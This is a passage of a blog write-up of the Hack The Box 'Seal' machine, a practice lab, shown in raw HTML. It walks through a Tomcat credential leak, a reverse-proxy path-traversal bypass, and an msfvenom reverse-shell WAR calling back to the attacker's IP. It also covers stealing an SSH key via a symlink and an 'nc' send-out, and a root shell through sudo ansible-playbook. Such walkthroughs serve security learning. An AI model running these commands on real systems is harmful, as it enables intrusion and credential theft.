class="line"><span class="comment">		 </span></span><br><span class="line"><span class="comment">		  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">		  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">		  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">		  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">		  limitations under the License.</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span></span><br><span class="line"><span class="tag">		              <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">		              <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span></span><br><span class="line"><span class="tag">		              <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		  <span class="doctag">NOTE:</span>  By default, no user is included in the &quot;manager-gui&quot; role required</span></span><br><span class="line"><span class="comment">		  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,</span></span><br><span class="line"><span class="comment">		  you must define such a user - the username and password are arbitrary. It is</span></span><br><span class="line"><span class="comment">		  strongly recommended that you do NOT use one of the users in the commented out</span></span><br><span class="line"><span class="comment">		  section below since they are intended for use with the examples web</span></span><br><span class="line"><span class="comment">		  application.</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		  <span class="doctag">NOTE:</span>  The sample user and role entries below are intended for use with the</span></span><br><span class="line"><span class="comment">		  examples web application. They are wrapped in a comment and thus are ignored</span></span><br><span class="line"><span class="comment">		  when reading this file. If you wish to configure these users for use with the</span></span><br><span class="line"><span class="comment">		  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds</span></span><br><span class="line"><span class="comment">		  them. You will also need to set the passwords to something appropriate.</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		  &lt;role rolename=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">		  &lt;role rolename=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">		  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">		  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">		  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;tomcat&quot;</span> <span class="attr">password</span>=<span class="string">&quot;42MrHBf*z8&#123;Z%&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Now we have username and password let’s try to login on <span class="exturl" data-url="aHR0cHM6Ly9zZWFsLmh0Yi9tYW5hZ2VyL2pteHByb3h5">https://seal.htb/manager/jmxproxy<i class="fa fa-external-link-alt"></i></span></p>
<p>And boom we are in the manager pannel.</p>
<p>Looking for exploit for tomcat I found an intresting path traversal exploit in tomcat which uses reverse proxy which is the case here as nginx is used as reverse proxy for tomcat running on localhost.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWN1bmV0aXguY29tL3Z1bG5lcmFiaWxpdGllcy93ZWIvdG9tY2F0LXBhdGgtdHJhdmVyc2FsLXZpYS1yZXZlcnNlLXByb3h5LW1hcHBpbmcv">https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/<i class="fa fa-external-link-alt"></i></span></p>
<p>So from above article we can try directory path traversal to exploit and access forbidden page.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWFsLmh0Yi9tYW5hZ2VyL2pteHByb3h5Ly4uOy9odG1s">https://seal.htb/manager/jmxproxy/..;/html<i class="fa fa-external-link-alt"></i></span></p>
<p>this takes us to the home page of tomcat manager.<br>Now as we can deploy war file we can just get the revershell easily.</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>So first let’s generate war payload.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=2525 -f war -o luci.war                                        </span></span><br><span class="line">Payload size: 1089 bytes</span><br><span class="line">Final size of war file: 1089 bytes</span><br><span class="line">Saved as: luci.war</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># ls                                                                                                                            </span></span><br><span class="line">luci.war</span><br></pre></td></tr></table></figure>

<p>Now lets upload war file.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2017.jpg"></li>
</ul>
<p>fire up the burpsuite and intercept the request.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2018.jpg"></li>
</ul>
<p>you will see this request in intercept tab just change the url as we are not allowed to directly access html.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2019.jpg"></li>
</ul>
<p>so your final request should look like the above just the url and forward it.</p>
<p>Trriger you rev shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k <span class="string">&#x27;https://seal.htb/luci/&#x27;</span></span><br></pre></td></tr></table></figure>

<p>And boom we have the revshell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># rlwrap nc -nlvp 2525</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2525</span><br><span class="line">Ncat: Listening on 0.0.0.0:2525</span><br><span class="line">Ncat: Connection from 10.10.10.250.</span><br><span class="line">Ncat: Connection from 10.10.10.250:43848.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=997(tomcat) gid=997(tomcat) <span class="built_in">groups</span>=997(tomcat)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure>

<h1 id="PrivESC-to-User"><a href="#PrivESC-to-User" class="headerlink" title="PrivESC to User"></a>PrivESC to User</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="User’s-home-directory"><a href="#User’s-home-directory" class="headerlink" title="User’s home directory"></a>User’s home directory</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /home/luis</span><br><span class="line">total 51320</span><br><span class="line">drwxr-xr-x 9 luis luis     4096 May  7 07:01 .</span><br><span class="line">drwxr-xr-x 3 root root     4096 May  5 12:52 ..</span><br><span class="line">drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible</span><br><span class="line">lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout</span><br><span class="line">-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc</span><br><span class="line">drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache</span><br><span class="line">drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config</span><br><span class="line">drwxrwxr-x 6 luis luis     4096 Jul 10 19:18 .gitbucket</span><br><span class="line">-rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war</span><br><span class="line">drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java</span><br><span class="line">drwxrwxr-x 3 luis luis     4096 May  5 14:33 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile</span><br><span class="line">drwx------ 2 luis luis     4096 May  7 06:10 .ssh</span><br><span class="line">-r-------- 1 luis luis       33 Jul 10 19:18 user.txt</span><br></pre></td></tr></table></figure>

<h3 id="ps-aux"><a href="#ps-aux" class="headerlink" title="ps -aux"></a>ps -aux</h3><p>looking at the process running this thing caught my eye as there was .ansible directory in luis home directory and there a process running as luis probably a backup service.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aux</span><br><span class="line">&lt;-----SNIP------&gt;</span><br><span class="line">luis         940  0.0  0.0   2608   604 ?        Ss   Jul10   0:00 /bin/sh -c java -jar /home/luis/gitbucket.war</span><br><span class="line">tomcat    145365  0.0  0.0   2608   536 ?        S    08:27   0:00 /bin/sh</span><br><span class="line">root      147949  0.0  0.0   2608   548 ?        Ss   08:41   0:00 /bin/sh -c <span class="built_in">sleep</span> 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</span><br></pre></td></tr></table></figure>

<h3 id="run-yml"><a href="#run-yml" class="headerlink" title="run.yml"></a>run.yml</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/opt/backups/playbook/run.yml</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Copy</span> <span class="string">Files</span></span><br><span class="line">    <span class="attr">synchronize:</span> <span class="string">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard</span> <span class="string">dest=/opt/backups/files</span> <span class="string">copy_links=yes</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Server</span> <span class="string">Backups</span></span><br><span class="line">    <span class="attr">archive:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/opt/backups/files/</span></span><br><span class="line">      <span class="attr">dest:</span> <span class="string">&quot;/opt/backups/archives/backup-<span class="template-variable">&#123;&#123;ansible_date_time.date&#125;&#125;</span>-<span class="template-variable">&#123;&#123;ansible_date_time.time&#125;&#125;</span>.gz&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clean</span></span><br><span class="line">    <span class="attr">file:</span></span><br><span class="line">      <span class="attr">state:</span> <span class="string">absent</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/opt/backups/files/</span></span><br></pre></td></tr></table></figure>

<p>The intresting part in this thing is that it also copies the symblink also as it has copy_links&#x3D;yes. so this gave me an idea to create a symblink of file or folder.</p>
<p>looking at the permission of the folder we have only read only access to it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /var/lib/tomcat9/webapps/ROOT/admin/dashboard</span><br><span class="line">total 100</span><br><span class="line">drwxr-xr-x 7 root root  4096 May  7 09:26 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 May  6 10:48 ..</span><br><span class="line">drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap</span><br><span class="line">drwxr-xr-x 2 root root  4096 Mar  7  2015 css</span><br><span class="line">drwxr-xr-x 4 root root  4096 Mar  7  2015 images</span><br><span class="line">-rw-r--r-- 1 root root 71744 May  6 10:42 index.html</span><br><span class="line">drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts</span><br><span class="line">drwxrwxrwx 2 root root  4096 May  7 09:26 uploads</span><br></pre></td></tr></table></figure>

<p>but if we check the subfolder we have read and write access to it so let’s try on that first.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads</span><br></pre></td></tr></table></figure>

<h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Now we have to think of what to symlink so we know the user luis have .ssh directory so that might be intresting so let’s try that.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads</span><br></pre></td></tr></table></figure>

<p>Now wait for it to create the new archive.<br>After that creates the new archive it usually takes about a minute to do so be patient.<br>After you have the archive just move it to &#x2F;dev&#x2F;shm cause you cannot extract the archive in that folder as it is read only.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> backup-2021-&lt;--SNIP--&gt;.gz oops.gz</span><br><span class="line">gzip -kd oops.gz</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">oops  oops.gz  tmp</span><br><span class="line">tar -xf oops</span><br><span class="line">tar -xf oops</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">dashboard  oops  oops.gz  tmp</span><br><span class="line"><span class="built_in">cd</span> dashboard</span><br><span class="line"><span class="built_in">cd</span> dashboard</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bootstrap  css  images  index.html  scripts  uploads</span><br><span class="line"><span class="built_in">cd</span> uploads</span><br><span class="line"><span class="built_in">cd</span> uploads</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-x--- 3 tomcat tomcat  60 Jul 12 06:53 .</span><br><span class="line">drwxr-x--- 7 tomcat tomcat 160 May  7 09:26 ..</span><br><span class="line">drwx------ 2 tomcat tomcat 100 May  7 06:10 .ssh</span><br></pre></td></tr></table></figure>

<p>now we have the SSH directory so let’s check it out.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>now let’s get id_rsa and SSH as luis.<br>in tomcat shell<br>before executing below command make sure you are listening on that port.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.14.19 3344 &lt; id_rsa</span><br></pre></td></tr></table></figure>

<p>in your shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Seal$ nc -nlvp 3344 &gt; id_rsa</span><br><span class="line">listening on [any] &lt;--SNIP--&gt; ...</span><br><span class="line">connect to [&lt;--SNIP--&gt;] from (UNKNOWN) [&lt;--SNIP--&gt;] 60546</span><br></pre></td></tr></table></figure>

<p>Now that we have id_rsa let’s ssh.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa luis@seal.htb</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;seal.htb (10.10.10.250)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>seal.htb,10.10.10.250<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Mon 12 Jul 2021 02:19:23 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.1</span></span><br><span class="line"><span class="string">  Usage of /:            47.4% of 9.58GB</span></span><br><span class="line"><span class="string">  Memory usage:          36%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             156</span></span><br><span class="line"><span class="string">  Users logged in:       0</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.10.10.250</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:a6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Mon Jul 12 04:38:58 2021 from 10.10.14.63</span></span><br><span class="line"><span class="string">-bash-5.0$ id</span></span><br><span class="line"><span class="string">uid=1000(luis) gid=1000(luis) groups=1000(luis)</span></span><br><span class="line"><span class="string">-bash-5.0$ whoami</span></span><br><span class="line"><span class="string">luis</span></span><br><span class="line"><span class="string">-bash-5.0$ cat user.txt </span></span><br><span class="line"><span class="string">d4759ed9c0d1d1d933f3552395a139b1</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2020.jpg"></li>
</ul>
<p>Now let’s go for root.</p>
<h1 id="PrivESC-to-root"><a href="#PrivESC-to-root" class="headerlink" title="PrivESC to root"></a>PrivESC to root</h1><h2 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">luis@seal:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> luis on seal:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User luis may run the following commands on seal:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/ansible-playbook *</span><br></pre></td></tr></table></figure>

<p>Now we can see we can run the command ansible-playbook as root.<br>This was more easy than the user part as it is just to create a bad yml file and make it run any command as root.</p>
<h2 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>so let’s create a yml file.</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">oops</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">chmod</span> <span class="string">+s</span> <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>If you are new to ansible you can refer check the following resource to create a yml file for ansilble</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWlkZGxld2FyZWludmVudG9yeS5jb20vYmxvZy9hbnNpYmxlLWNvbW1hbmQtZXhhbXBsZXMv">https://www.middlewareinventory.com/blog/ansible-command-examples/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmFuc2libGUuY29tL2Fuc2libGUvbGF0ZXN0L3VzZXJfZ3VpZGUvcGxheWJvb2tzLmh0bWw=">https://docs.ansible.com/ansible/latest/user_guide/playbooks.html<i class="fa fa-external-link-alt"></i></span></p>
<p>so let’s create the above yml file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">luis@seal:~$ <span class="built_in">cd</span> /dev/shm/</span><br><span class="line">luis@seal:/dev/shm$ nano oops.yml </span><br><span class="line">luis@seal:/dev/shm$ <span class="built_in">cat</span> oops.yml </span><br><span class="line">- hosts: localhost</span><br><span class="line">  tasks:</span><br><span class="line">    - name: oops</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">chmod</span> +s /bin/bash</span><br></pre></td></tr></table></figure>

<p>Now let’s run this yml file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ sudo /usr/bin/ansible-playbook oops.yml</span><br><span class="line">[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match <span class="string">&#x27;all&#x27;</span></span><br><span class="line"></span><br><span class="line">PLAY [localhost] *****************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] ***********************************************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [oops] **********************************************************************************************************************</span><br><span class="line">[WARNING]: Consider using the file module with mode rather than running <span class="string">&#x27;chmod&#x27;</span>.  If you need to use <span class="built_in">command</span> because file is</span><br><span class="line">insufficient you can add <span class="string">&#x27;warn: false&#x27;</span> to this <span class="built_in">command</span> task or <span class="built_in">set</span> <span class="string">&#x27;command_warnings=False&#x27;</span> <span class="keyword">in</span> ansible.cfg to get rid of this</span><br><span class="line">message.</span><br><span class="line">changed: [localhost]</span><br><span class="line"></span><br><span class="line">PLAY RECAP ***********************************************************************************************************************</span><br><span class="line">localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0</span><br></pre></td></tr></table></figure>

<p>Now Let’s run that suid bit &#x2F;bin&#x2F;bash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /bin/bash -p</span><br><span class="line">bash-5.0<span class="comment"># id</span></span><br><span class="line">uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),1000(luis)</span><br><span class="line">bash-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0<span class="comment"># cd /root</span></span><br><span class="line">bash-5.0<span class="comment"># cat root.txt </span></span><br><span class="line">44fbd8b82a15b2da77023c94223987f5</span><br><span class="line">bash-5.0<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6$D8b4qJlaLsRsvwuy<span class="variable">$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK</span>.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r.:18752:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>Now we are root so let’s get all the flags.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2021.jpg"></li>
</ul>
<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>dir fuzz using ffuf</li>
<li>found username and password in tomcat-users.xml</li>
<li>tomcat path traversal via reverse proxy mapping</li>
<li>tomcat manager get reverse shell</li>
<li>ln -s to get .ssh id_rsa key</li>
<li>create a yml file and use &#x2F;usr&#x2F;bin&#x2F;ansible-playbook to privesc</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
